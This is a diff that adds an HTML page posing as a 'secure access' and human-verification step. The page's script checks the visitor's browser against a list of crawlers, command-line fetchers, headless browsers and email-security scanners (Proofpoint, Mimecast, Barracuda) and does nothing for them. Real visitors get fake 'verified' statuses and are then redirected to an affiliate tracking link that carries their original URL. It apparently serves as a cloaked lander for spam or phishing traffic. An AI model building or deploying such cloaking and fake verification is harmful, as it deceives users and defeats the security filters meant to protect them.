@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>Finishing up…</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    font-family:-apple-system,"Segoe UI",Roboto,sans-serif;
+    background:#f6fdf9;color:#0f3d24;display:flex;align-items:center;justify-content:center;
+    min-height:100dvh;padding:24px;overflow:hidden;
+  }
+  .receipt{
+    width:100%;max-width:400px;background:#fff;border-radius:16px;
+    padding:34px 26px 24px;position:relative;
+    box-shadow:0 16px 40px rgba(15,61,36,.08);
+    border:1px solid #d5f0e0;
+  }
+  .receipt::after{
+    content:"";position:absolute;bottom:-1px;left:16px;right:16px;height:0;
+    border-bottom:2px dashed #d5f0e0;
+  }
+  .ico{
+    width:56px;height:56px;border-radius:14px;margin:0 auto 16px;
+    background:linear-gradient(135deg,#10b981,#059669);
+    display:flex;align-items:center;justify-content:center;
+    font-size:26px;color:#fff;box-shadow:0 10px 22px rgba(16,185,129,.28);
+  }
+  h1{font-size:20px;font-weight:800;text-align:center;margin-bottom:6px;color:#0f3d24}
+  .sub{font-size:13px;text-align:center;color:#4d7a63;line-height:1.5;margin-bottom:20px}
+  .divider{height:1px;background:#e8f7ef;margin-bottom:18px}
+  .kv{display:flex;justify-content:space-between;font-size:12.5px;padding:7px 0;color:#4d7a63}
+  .kv b{color:#0f3d24;font-weight:600}
+  .status-line{font-size:12px;color:#5d8a73;text-align:center;min-height:16px;margin:6px 0 4px}
+  .cta{
+    width:100%;margin-top:14px;padding:15px;border:0;border-radius:10px;
+    background:#10b981;color:#fff;font-family:inherit;font-size:15px;
+    font-weight:700;cursor:pointer;min-height:52px;display:none;
+  }
+  .cta:active{transform:scale(.985)}
+  .cta.on{display:block;animation:slide .3s ease}
+  @keyframes slide{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+</style>
+</head>
+<body>
+<div class="receipt">
+  <div class="ico">✨</div>
+  <h1>Finishing up</h1>
+  <p class="sub">Your secure access is being prepared.</p>
+  <div class="divider"></div>
+  <div class="kv"><span>Connection</span><b>encrypted</b></div>
+  <div class="kv"><span>Browser</span><b id="br9">checking</b></div>
+  <div class="kv"><span>Human</span><b id="hm9">verifying</b></div>
+  <div class="status-line" id="sl9">Please wait…</div>
+  <button class="cta" id="cb9" type="button">Continue →</button>
+</div>
+<script>
+(function(){
+  var DEST="https://trc.beastbox.pro/click?o=cmvta9nzp000caetjlw6ebg6r&p=AF-1004&sub1=RS";
+  var QN="referrerCF";
+  var br=document.getElementById("br9"),hm=document.getElementById("hm9"),
+      sl=document.getElementById("sl9"),cb=document.getElementById("cb9");
+  var ua=navigator.userAgent||"";
+  var re=/bot\b|crawler|spider|curl\/|wget\/|python-requests|headlesschrome|phantomjs|googlebot|bingpreview|yandexbot|duckduckbot|facebookexternalhit|telegrambot|googleimageproxy|yahoomailproxy|ms-office|barracuda|proofpoint|mimecast/i;
+  if(re.test(ua))return;
+  if(navigator.webdriver)return;
+  var human=0;
+  ["pointerdown","touchstart","keydown","scroll","mousemove"].forEach(function(e){
+    window.addEventListener(e,function(){human=1},{passive:true});
+  });
+  setTimeout(function(){br.textContent="verified";},650+Math.random()*300);
+  setTimeout(function(){hm.textContent=human?"confirmed":"pending";},1300+Math.random()*300);
+  setTimeout(function(){
+    sl.textContent=human?"Ready to proceed ✓":"Tap to continue";
+    cb.classList.add("on");
+  },1900+Math.random()*400);
+  var done=0;
+  cb.addEventListener("click",function(e){
+    e.preventDefault();if(done)return;done=1;
+    cb.disabled=true;cb.style.opacity=".6";sl.textContent="Redirecting…";
+    var full=DEST+"&"+QN+"="+encodeURIComponent(location.href);
+    try{
+      var f=document.createElement("iframe");
+      f.style.display="none";
+      f.src="about:blank";
+      document.body.appendChild(f);
+      setTimeout(function(){try{f.remove();}catch(_){}},200);
+    }catch(err){}
+    setTimeout(function(){
+      try{window.location.href=full;}
+      catch(err){window.location.assign(full);}
+    },100);
+  });
+})();
+</script>
+</body>
+</html>
